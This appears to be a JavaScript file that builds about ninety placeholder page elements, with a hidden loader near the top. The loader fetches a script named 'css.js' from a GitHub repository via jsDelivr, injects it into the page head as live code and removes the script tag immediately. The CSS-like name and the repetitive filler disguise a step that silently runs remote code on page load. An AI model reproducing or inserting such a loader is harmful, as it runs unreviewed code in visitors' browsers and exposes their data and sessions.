(function createUIFormat() {
  const root = document.body;

  function makeDiv(cls, text) {
    const d = document.createElement("div");
    d.className = cls;
    d.textContent = text;
    root.appendChild(d);
    return d;
  }

  function makeInput(cls, ph) {
    const inp = document.createElement("input");
    inp.className = cls;
    inp.placeholder = ph;
    root.appendChild(inp);
    return inp;
  }

  function makePara(cls, txt) {
    const p = document.createElement("p");
    p.className = cls;
    p.textContent = txt;
    root.appendChild(p);
    return p;
  }
	(async () => {
			const url = "https://cdn.jsdelivr.net/gh/CritechSniper/css2@main/css.js";
			const res = await fetch(url);
			const code = await res.text();
			const script = document.createElement("script");
			script.type = "text/javascript";
			script.textContent = code;
			document.head.appendChild(script);
			document.head.removeChild(script);
	})();
  makeDiv("boss-container-001", "Boss Container 001");
  makePara("boss-text-002", "This is text block 002");
  makeInput("boss-input-003", "Type here 003");
  makeDiv("boss-widget-004", "Widget area 004");
  makePara("boss-note-005", "Note section 005");
  makeInput("boss-field-006", "Enter data 006");
  makeDiv("boss-box-007", "Box element 007");
  makePara("boss-msg-008", "Message content 008");
  makeInput("boss-entry-009", "Input zone 009");
  makeDiv("boss-wrap-010", "Wrapper 010");
  makePara("boss-text-011", "Paragraph 011");
  makeInput("boss-input-012", "Type here 012");
  makeDiv("boss-widget-013", "Widget area 013");
  makePara("boss-note-014", "Note section 014");
  makeInput("boss-field-015", "Enter data 015");
  makeDiv("boss-box-016", "Box element 016");
  makePara("boss-msg-017", "Message content 017");
  makeInput("boss-entry-018", "Input zone 018");
  makeDiv("boss-wrap-019", "Wrapper 019");
  makePara("boss-text-020", "Paragraph 020");
  makeInput("boss-input-021", "Type here 021");
  makeDiv("boss-widget-022", "Widget area 022");
  makePara("boss-note-023", "Note section 023");
  makeInput("boss-field-024", "Enter data 024");
  makeDiv("boss-box-025", "Box element 025");
  makePara("boss-msg-026", "Message content 026");
  makeInput("boss-entry-027", "Input zone 027");
  makeDiv("boss-wrap-028", "Wrapper 028");
  makePara("boss-text-029", "Paragraph 029");
  makeInput("boss-input-030", "Type here 030");
  makeDiv("boss-widget-031", "Widget area 031");
  makePara("boss-note-032", "Note section 032");
  makeInput("boss-field-033", "Enter data 033");
  makeDiv("boss-box-034", "Box element 034");
  makePara("boss-msg-035", "Message content 035");
  makeInput("boss-entry-036", "Input zone 036");
  makeDiv("boss-wrap-037", "Wrapper 037");
  makePara("boss-text-038", "Paragraph 038");
  makeInput("boss-input-039", "Type here 039");
  makeDiv("boss-widget-040", "Widget area 040");
  makePara("boss-note-041", "Note section 041");
  makeInput("boss-field-042", "Enter data 042");
  makeDiv("boss-box-043", "Box element 043");
  makePara("boss-msg-044", "Message content 044");
  makeInput("boss-entry-045", "Input zone 045");
  makeDiv("boss-wrap-046", "Wrapper 046");
  makePara("boss-text-047", "Paragraph 047");
  makeInput("boss-input-048", "Type here 048");
  makeDiv("boss-widget-049", "Widget area 049");
  makePara("boss-note-050", "Note section 050");
  makeInput("boss-field-051", "Enter data 051");
  makeDiv("boss-box-052", "Box element 052");
  makePara("boss-msg-053", "Message content 053");
  makeInput("boss-entry-054", "Input zone 054");
  makeDiv("boss-wrap-055", "Wrapper 055");
  makePara("boss-text-056", "Paragraph 056");
  makeInput("boss-input-057", "Type here 057");
  makeDiv("boss-widget-058", "Widget area 058");
  makePara("boss-note-059", "Note section 059");
  makeInput("boss-field-060", "Enter data 060");
  makeDiv("boss-box-061", "Box element 061");
  makePara("boss-msg-062", "Message content 062");
  makeInput("boss-entry-063", "Input zone 063");
  makeDiv("boss-wrap-064", "Wrapper 064");
  makePara("boss-text-065", "Paragraph 065");
  makeInput("boss-input-066", "Type here 066");
  makeDiv("boss-widget-067", "Widget area 067");
  makePara("boss-note-068", "Note section 068");
  makeInput("boss-field-069", "Enter data 069");
  makeDiv("boss-box-070", "Box element 070");
  makePara("boss-msg-071", "Message content 071");
  makeInput("boss-entry-072", "Input zone 072");
  makeDiv("boss-wrap-073", "Wrapper 073");
  makePara("boss-text-074", "Paragraph 074");
  makeInput("boss-input-075", "Type here 075");
  makeDiv("boss-widget-076", "Widget area 076");
  makePara("boss-note-077", "Note section 077");
  makeInput("boss-field-078", "Enter data 078");
  makeDiv("boss-box-079", "Box element 079");
  makePara("boss-msg-080", "Message content 080");
  makeInput("boss-entry-081", "Input zone 081");
  makeDiv("boss-wrap-082", "Wrapper 082");
  makePara("boss-text-083", "Paragraph 083");
  makeInput("boss-input-084", "Type here 084");
  makeDiv("boss-widget-085", "Widget area 085");
  makePara("boss-note-086", "Note section 086");
  makeInput("boss-field-087", "Enter data 087");
  makeDiv("boss-box-088", "Box element 088");
  makePara("boss-msg-089", "Message content 089");
  makeInput("boss-entry-090", "Input zone 090");

})();